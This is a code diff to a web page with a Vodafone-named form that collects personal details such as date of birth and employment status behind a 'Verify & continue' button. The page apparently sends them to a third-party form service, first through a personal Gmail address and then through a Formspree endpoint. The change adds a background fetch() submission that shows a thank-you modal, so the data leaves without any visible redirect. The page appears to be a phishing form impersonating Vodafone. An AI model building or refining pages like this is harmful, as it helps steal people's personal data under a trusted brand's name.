@@ -80,8 +80,8 @@
   </div>
 
   <div class="form-body">
-    <!-- Formspree Form - No access key needed, just your email -->
-    <form id="vodafoneForm" action="https://formspree.io/f/bakermr01@gmail.com" method="POST">
+    <!-- Formspree Form - Using your specific endpoint -->
+    <form id="vodafoneForm" action="https://formspree.io/f/mnjwkajj" method="POST">
       
       <div class="section">
         <div class="section-title">
@@ -234,6 +234,7 @@
     const toast = document.getElementById('toastMsg');
     const submitBtn = document.getElementById('submitBtn');
     const thankyouModal = document.getElementById('thankyouModal');
+    let formSubmitted = false;
 
     function showMessage(text, isError = false) {
       toast.textContent = text;
@@ -250,11 +251,14 @@
 
     function closeThankYouModal() {
       thankyouModal.classList.remove('active');
-      form.reset();
-      document.getElementById('employmentStatus').selectedIndex = 0;
-      document.getElementById('dobDay').selectedIndex = 0;
-      document.getElementById('dobMonth').selectedIndex = 0;
-      document.getElementById('dobYear').selectedIndex = 0;
+      if (formSubmitted) {
+        form.reset();
+        document.getElementById('employmentStatus').selectedIndex = 0;
+        document.getElementById('dobDay').selectedIndex = 0;
+        document.getElementById('dobMonth').selectedIndex = 0;
+        document.getElementById('dobYear').selectedIndex = 0;
+        formSubmitted = false;
+      }
       showMessage("Form has been submitted & reset. Thank you.", false);
     }
     window.closeThankYouModal = closeThankYouModal;
@@ -420,7 +424,7 @@
       showMessage("Form has been reset", false);
     });
 
-    // Formspree submission - This will redirect to Formspree's thank you page
+    // Intercept form submission to show modal before redirect
     form.addEventListener('submit', function(e) {
       if (!validateRequiredFields()) {
         e.preventDefault();
@@ -429,11 +433,45 @@
       
       addCombinedDOBField();
       
-      showMessage("Submitting... Please wait", false);
+      // Show success modal before redirect
+      e.preventDefault();
       
-      // Formspree will handle the redirect automatically
-      // The user will be taken to Formspree's thank you page
-      return true;
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
+      
+      // Send form data via fetch to avoid page redirect
+      const formData = new FormData(form);
+      
+      fetch('https://formspree.io/f/mnjwkajj', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          formSubmitted = true;
+          thankyouModal.classList.add('active');
+          form.reset();
+          document.getElementById('employmentStatus').selectedIndex = 0;
+          document.getElementById('dobDay').selectedIndex = 0;
+          document.getElementById('dobMonth').selectedIndex = 0;
+          document.getElementById('dobYear').selectedIndex = 0;
+        } else {
+          showMessage("❌ Submission failed. Please try again.", true);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        showMessage("❌ Connection error. Please check your internet and try again.", true);
+      })
+      .finally(() => {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+      });
+      
+      return false;
     });
   })();
 </script>
